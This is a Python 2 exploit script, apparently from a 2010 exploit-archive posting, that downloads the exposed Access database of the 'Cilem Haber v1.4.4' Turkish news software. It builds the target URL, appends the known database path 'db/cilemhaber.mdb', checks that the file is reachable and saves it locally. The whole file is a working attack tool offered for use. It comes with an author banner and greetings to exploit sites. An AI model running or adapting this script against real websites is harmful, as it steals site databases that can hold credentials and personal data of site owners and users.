#!/usr/bin/env python
#-*- coding:cp1254 -*-
 
'''
# Title        : Cilem Haber v1.4.4 (Tr) Database Disclosure Exploit (.py)
# Down. Script : http://www.aspindir.com/indir.asp?id=3287&sIslem=%DDndir
# Proof        : http://img718.imageshack.us/img718/7993/cilem.jpg
# Tested       : Windows XP Professional sp3
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org
# Date         : 04/10/2010
# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : Dont Forget My Python Vers: 2.7
# Lakirdi      : Nasil Kullanabilirsiniz Bu Acigi ? Oda Bende Kalsin :))
'''
 
import sys, urllib2, re, os, time
 
def indiriyoruz(url):
     
    import urllib
    aldosyayi = urllib.urlopen(url)
    indiraq = open(url.split('/')[-1], 'wb')
    indiraq.write(aldosyayi.read())
    aldosyayi.close()
    indiraq.close()
 
if len(sys.argv) < 2:
                    import os
                    os.system('cls')
                    os.system('clear')
                    os.system('color 2')
                    print "_______________________________________________________________"
                    print "                                                               "
                    print " Cilem Haber v1.4.4 (Tr) Database Disclosure Exploit (.py)     "
                    print "                                                               "
                    print " coded by ZoRLu                                                "
                    print "                                                               "
                    print ' usage: %s http://server.com/path/' % os.path.basename(sys.argv[0])
                    print "                                                               "
                    print "_______________________________________________________________"
                    sys.exit(1)
 
''' link kontrol 1 '''
                     
add = "http://"
add2 = "/"
sitemiz = sys.argv[1]

if sitemiz[-1:] != add2:
    print "\nnwhere is  it: " + add2
    print "okk I will add"
    time.sleep(2)
    sitemiz += add2
    print "its ok" + " " + sitemiz
     
if sitemiz[:7]  != add:
    print "\nwhere is it: " + add
    print "okk I will add"
    time.sleep(2)
    sitemiz =  add + sitemiz
    print "its ok" + " " + sitemiz
 
vulnfile = "db/cilemhaber.mdb"
url2 = sitemiz + vulnfile
 
''' link kontrol 2 '''
 
try:
    adreskontrol = urllib2.urlopen(url2).read()
     
    if len(adreskontrol) > 0:
                                         
        print "\nGood Job Bro!"
     
except urllib2.HTTPError:
        import os
        import sys
        print "\nForbidden Sorry! Server has a Security!"
        sys.exit(1)
     
 
''' dosya indiriliyor '''
 
if __name__ == '__main__':
    import sys
    if len(sys.argv) == 2:
        print "\nFile is Downloading\n"
        try:
            indiriyoruz(url2)
        except IOError:
            print '\nFilename not found.'
